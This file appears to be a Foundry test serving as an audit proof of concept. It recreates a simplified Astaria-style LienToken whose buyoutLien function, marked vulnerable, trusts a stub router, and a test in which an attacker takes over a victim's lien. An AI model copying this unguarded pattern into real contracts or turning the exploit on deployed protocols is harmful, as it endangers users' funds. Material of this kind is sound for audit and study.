pragma solidity 0.8.20;

import "forge-std/Test.sol";

interface ITokenContract { function computeId(uint256 tokenId) external pure returns (uint256); }
interface ITransferProxy { function tokenTransferFrom(address token, address from, address to, uint256 amount) external; }

contract StubRouter {
  struct LienDetails { uint256 maxAmount; uint256 rate; uint256 duration; }
  function validateCommitment(bytes memory) external pure returns (bool, LienDetails memory) {
    return (true, LienDetails({maxAmount: type(uint256).max, rate: 1, duration: 1}));
  }
  function isValidRefinance(bytes memory, LienDetails memory) external pure returns (bool) { return true; }
}

contract StubTransferProxy is ITransferProxy {
  address public lastFrom; address public lastTo; uint256 public lastAmount; address public lastToken;
  function tokenTransferFrom(address token, address from, address to, uint256 amount) external {
    lastToken = token; lastFrom = from; lastTo = to; lastAmount = amount;
  }
}

contract DummyToken is ITokenContract {
  uint256 public id;
  constructor(uint256 _id) { id = _id; }
  function computeId(uint256) external view returns (uint256) { return id; }
}

contract LienToken {
  struct Incoming { ITokenContract tokenContract; uint256 tokenId; }
  struct LienActionBuyout { Incoming incoming; address receiver; uint8 position; }
  struct Lien { uint256 amount; address payee; bool active; uint32 last; uint32 start; uint240 rate; uint32 duration; }

  mapping(uint256 => uint256[]) public liens;
  mapping(uint256 => Lien) public lienData;
  mapping(uint256 => address) owners;

  StubRouter public ASTARIA_ROUTER;
  ITransferProxy public TRANSFER_PROXY;
  address public WETH;

  constructor(StubRouter router, ITransferProxy proxy, address _WETH) { ASTARIA_ROUTER = router; TRANSFER_PROXY = proxy; WETH = _WETH; }

  function createTestLien(uint256 collateralId, uint256 lienId, address owner, address payee, uint256 amount) external {
    owners[lienId] = owner;
    liens[collateralId].push(lienId);
    lienData[lienId] = Lien({amount: amount, payee: payee, active: true, last: uint32(block.timestamp), start: uint32(block.timestamp), rate: 1, duration: 1});
  }

  function ownerOf(uint256 id) public view returns (address) { return owners[id]; }
  function _transfer(address from, address to, uint256 id) internal { owners[id] = to; }
  function getPayee(uint256 lienId) public view returns (address) { return lienData[lienId].payee; }

  // vulnerable function: relies solely on external router checks
  function buyoutLien(LienActionBuyout calldata params) external {
    (bool valid, StubRouter.LienDetails memory ld) = ASTARIA_ROUTER.validateCommitment(abi.encodePacked(params.incoming.tokenContract, params.incoming.tokenId));
    if (!valid) revert();

    uint256 collateralId = params.incoming.tokenContract.computeId(params.incoming.tokenId);
    (uint256 owed, uint256 buyout) = getBuyout(collateralId, params.position);
    uint256 lienId = liens[collateralId][params.position];

    if (ld.maxAmount < owed) revert();
    // router is expected to enforce refinance rules
    if (!ASTARIA_ROUTER.isValidRefinance(abi.encodePacked(lienData[lienId].amount), ld)) revert();

    TRANSFER_PROXY.tokenTransferFrom(WETH, msg.sender, getPayee(lienId), buyout);

    lienData[lienId].last = uint32(block.timestamp);
    lienData[lienId].start = uint32(block.timestamp);
    lienData[lienId].rate = uint240(ld.rate);
    lienData[lienId].duration = uint32(ld.duration);

    _transfer(ownerOf(lienId), params.receiver, lienId);
  }

  function getBuyout(uint256 collateralId, uint256 position) public view returns (uint256, uint256) {
    uint256 lienId = liens[collateralId][position];
    uint256 owed = lienData[lienId].amount;
    return (owed, owed); // simplified: buyout equals owed
  }
}

contract LienTokenTest is Test {
  LienToken target; StubRouter router; StubTransferProxy proxy; DummyToken token;
  address attacker; address victim;

  function setUp() public {
    router = new StubRouter(); proxy = new StubTransferProxy(); token = new DummyToken(123);
    target = new LienToken(router, ITransferProxy(address(proxy)), address(0xBEEF));
    attacker = makeAddr("attacker"); victim = makeAddr("victim");
    // create a lien at collateralId 123, lienId 999 owned by victim, payee is victim, amount 100
    target.createTestLien(123, 999, victim, victim, 100);
  }

  function test_attacker_exploits_buyoutLien() public {
    LienToken.Incoming memory inb = LienToken.Incoming({tokenContract: ITokenContract(address(token)), tokenId: 1});
    LienToken.LienActionBuyout memory p = LienToken.LienActionBuyout({incoming: inb, receiver: attacker, position: 0});
    vm.prank(attacker);
    target.buyoutLien(p);
    assertEq(target.ownerOf(999), attacker);
    assertEq(proxy.lastFrom(), attacker);
    assertEq(proxy.lastTo(), victim);
    assertEq(proxy.lastAmount(), 100);
  }
}

